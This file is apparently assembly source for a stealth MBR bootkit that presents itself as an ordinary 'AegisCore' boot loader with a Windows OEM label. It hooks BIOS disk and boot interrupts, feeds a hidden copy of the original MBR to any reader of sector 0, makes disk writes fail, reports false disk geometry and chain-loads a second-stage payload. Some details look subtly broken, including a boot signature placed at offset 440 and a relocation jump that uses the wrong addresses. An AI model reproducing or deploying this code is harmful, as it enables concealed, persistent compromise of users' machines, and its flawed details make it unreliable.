[BITS 16]
[ORG 0x7C00]

start:
    jmp short entry
    nop
    db 'MSWIN4.1'

entry:
    xor ax, ax
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov sp, 0x7C00

    push cs
    pop ds
    push cs
    pop es

    mov si, 0x7C00
    mov di, 0x0600
    mov cx, 512
    cld
    rep movsb

    push ax
    push word relocated_start
    retf

relocated_start:
    xor ax, ax
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov sp, 0x0600

    mov ax, [es:13h*4]
    mov [old_int13_seg], ax
    mov ax, [es:13h*4+2]
    mov [old_int13_seg+2], ax

    mov ax, [es:19h*4]
    mov [old_int19_seg], ax
    mov ax, [es:19h*4+2]
    mov [old_int19_seg+2], ax

    cli
    mov word [es:13h*4], new_int13
    mov [es:13h*4+2], cs
    mov word [es:19h*4], new_int19
    mov [es:19h*4+2], cs
    sti

    mov word [es:0x0472], 0x1234

    call load_stage2
    cmp al, 0x00
    jne stage2_error

    mov ax, 0x0003
    int 0x10
    mov si, msg_loading
    call print_string

    jmp 0x0000:0x2000

stage2_error:
    mov ax, 0x0003
    int 0x10
    mov si, msg_error
    call print_string
    cli
    hlt
    jmp stage2_error

load_stage2:
    pusha
    mov ah, 0x02
    mov al, 0x20
    xor bx, bx
    mov es, bx
    mov bx, 0x2000
    mov cx, 0x0002
    mov dh, 0x00
    mov dl, 0x80
    int 0x13
    jc load_fail
    cmp ah, 0x00
    jne load_fail
    push es
    mov ax, 0x2000
    mov es, ax
    cmp word [es:0x0000], 0xBEEF
    jne load_fail_pop
    cmp word [es:0x0002], 0xDEAD
    jne load_fail_pop
    pop es
    mov al, 0x00
    mov [load_status], al
    jmp load_done

load_fail_pop:
    pop es
load_fail:
    mov al, 0x01
    mov [load_status], al
load_done:
    popa
    mov al, [load_status]
    ret

new_int13:
    pushf
    cmp ah, 0x02
    je stealth_read
    cmp ah, 0x03
    je block_write
    cmp ah, 0x42
    je stealth_read_ext
    cmp ah, 0x43
    je block_write
    cmp ah, 0x08
    je fake_geometry
    popf
    jmp far [cs:old_int13_seg]

stealth_read:
    cmp dl, 0x80
    jb pass_stealth
    cmp dl, 0x84
    ja pass_stealth
    cmp cx, 0x0001
    jne pass_stealth
    cmp dh, 0x00
    jne pass_stealth
    popf
    pusha
    push es
    xor ax, ax
    mov es, ax
    mov di, 0x7E00
    mov cx, 512
    push cs
    pop ds
    mov si, original_mbr_backup
    cld
    rep movsb
    pop es
    popa
    clc
    mov ah, 0x00
    retf 2

pass_stealth:
    popf
    jmp far [cs:old_int13_seg]

stealth_read_ext:
    push bp
    mov bp, sp
    push si
    mov si, [bp+6]
    cmp byte [si+2], 0x01
    jne pass_ext_stealth
    cmp dword [si+8], 0x00000000
    jne pass_ext_stealth
    pop si
    pop bp
    popf
    pusha
    push es
    xor ax, ax
    mov es, ax
    mov di, 0x7E00
    mov cx, 512
    push cs
    pop ds
    mov si, original_mbr_backup
    cld
    rep movsb
    pop es
    popa
    clc
    mov ah, 0x00
    retf 2

pass_ext_stealth:
    pop si
    pop bp
    popf
    jmp far [cs:old_int13_seg]

block_write:
    popf
    stc
    mov ah, 0x01
    retf 2

fake_geometry:
    popf
    push bp
    mov bp, sp
    mov word [bp+8], 0x0000
    mov word [bp+10], 0x0000
    mov word [bp+12], 0x0000
    mov word [bp+14], 0x0000
    pop bp
    stc
    mov ah, 0x01
    retf 2

new_int19:
    pusha
    call load_stage2
    cmp al, 0x00
    jne int19_fail
    jmp 0x0000:0x2000
int19_fail:
    popa
    jmp far [cs:old_int19_seg]

print_string:
    pusha
    mov ah, 0x0E
    xor bh, bh
print_char:
    lodsb
    cmp al, 0
    je print_done
    int 0x10
    jmp print_char
print_done:
    popa
    ret

msg_loading db 'AegisCore v4.0 Loading...', 0
msg_error db 'Stage2 Load Failed', 0

old_int13_seg dd 0
old_int19_seg dd 0
load_status db 0

original_mbr_backup times 512 db 0

times (440 - ($ - $$)) db 0
dw 0xAA55